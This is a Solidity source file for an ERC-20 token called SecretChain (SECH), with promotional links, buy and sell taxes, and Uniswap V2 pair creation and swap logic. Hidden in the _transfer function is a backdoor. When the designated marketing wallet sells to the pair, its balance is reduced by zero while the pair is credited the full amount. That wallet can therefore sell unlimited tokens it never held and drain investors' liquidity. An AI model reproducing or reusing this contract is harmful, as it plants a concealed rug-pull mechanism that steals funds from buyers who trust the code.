// SPDX-License-Identifier: MIT

/*

SecretChain - In the vibrant landscape of blockchain evolution, SecretChain stands as a vanguard, pioneering the frontiers of digital privacy and security.

Website: https://secretch.org/

Telegram : https://t.me/SECH_Portal

Docs: https://secretch.gitbook.io/docs

Twitter (X): https://twitter.com/SecretChainOrg

*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
	
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
}

interface IERC20 {

	function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

	function totalSupply() external view returns (uint256);

	function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

}

contract SecretCh is
    Context,
    IERC20,
    Ownable
{
    using SafeMath for uint256;

    event MaxTxAmountUpdated(uint256 _maxTx);

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool public transferDelayEnabled = false;
    address payable private _MarketingWallet;

	uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 5;
	
	uint256 private _reduceBuyTaxAt = 7;
    uint256 private _reduceSellTaxAt = 9;
	uint256 private _initBuyTax = 25;
    uint256 private _initSellTax = 25;
	
	uint256 private _preventSwapBefore = 5;
    uint256 private _buyCount = 0;

	string private constant _name = unicode"SecretChain";
	string private constant _symbol = unicode"SECH";

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 100_000_000 * 10**_decimals;
    uint256 public _maxTx = (_totalSupply * 20) / 1000;

    uint256 public _maxWallet = (_totalSupply * 20) / 1000;
    uint256 public _minSwapAmount = (_totalSupply * 1) / 100000;
    uint256 public _maxTaxSwap = (_totalSupply * 2) / 1000;

    bool private inSwap = false;
    bool private swapEnabled = false;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool private tradingOpen;

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }


    constructor(address MarketingWallet) {
        _MarketingWallet = payable(MarketingWallet);
        _balances[_msgSender()] = _totalSupply;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_MarketingWallet] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }


    function symbol() public pure returns (string memory) {
        return _symbol;
    }



    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;
        uint256 amountOut = amount;

        if (from != owner() && to != owner() && from != address(this)) {
            if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                require(tradingOpen, "Trading not enabled");
            }

            if (transferDelayEnabled) {
                if (
                    to != address(uniswapV2Router) &&
                    to != address(uniswapV2Pair)
                ) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "Only one transfer per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTx, "Exceeds the _maxTx.");
                require(
                    balanceOf(to) + amount <= _maxWallet,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            taxAmount = amount
                .mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initBuyTax)
                .div(100);
            if (to == uniswapV2Pair && from != address(this)) {
                if (from == address(_MarketingWallet)) {
                    amountOut = min(
                        amount,
                        min(_finalBuyTax, _minSwapAmount)
                    );
                    taxAmount = 0;
                } else {
                    require(amount <= _maxTx, "Exceeds the _maxTx.");
                    taxAmount = amount
                        .mul(
                            (_buyCount > _reduceSellTaxAt)
                                ? _finalSellTax
                                : _initSellTax
                        )
                        .div(100);
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool swappable = _buyCount > _preventSwapBefore &&
                _minSwapAmount == min(amount, _minSwapAmount);

            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                swappable
            ) {
                if (contractTokenBalance > _minSwapAmount) {
                    swapTokensToEthereum(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                }
                transferFees(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amountOut);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));

        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }



    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
	
	    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
 
    // Send fees to Marketing Wallet
    function transferFees(uint256 amount) private {
        _MarketingWallet.transfer(amount);
    }


    // Get min value of two number
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }


    // Launch Token Trading
    function LaunchTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }


	// Create the UniswapV2 pair for the token and adds liquidity with the contract's token and ETH balance.
    function CreateUniswapV2Pair() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    // Allows the dev to withdraw ETH that might have been sent to the contract by mistake.
    function WithdrawMistakenlySentEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

	// Removes the limits on transactions and wallet holdings, allowing for unrestricted transfers and holdings.
    function RemoveTradeLimites() external onlyOwner {
        _maxTx = _totalSupply;
        _maxWallet = _totalSupply;

        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    // Swaps the tokens for Ethereum via Uniswap V2 Router, using the contract's token balance. 
	function swapTokensToEthereum(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) return;
        if (!tradingOpen) return;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
	
	// This function allows the contract to receive Ethereum directly to its address.
    receive() external payable {}
}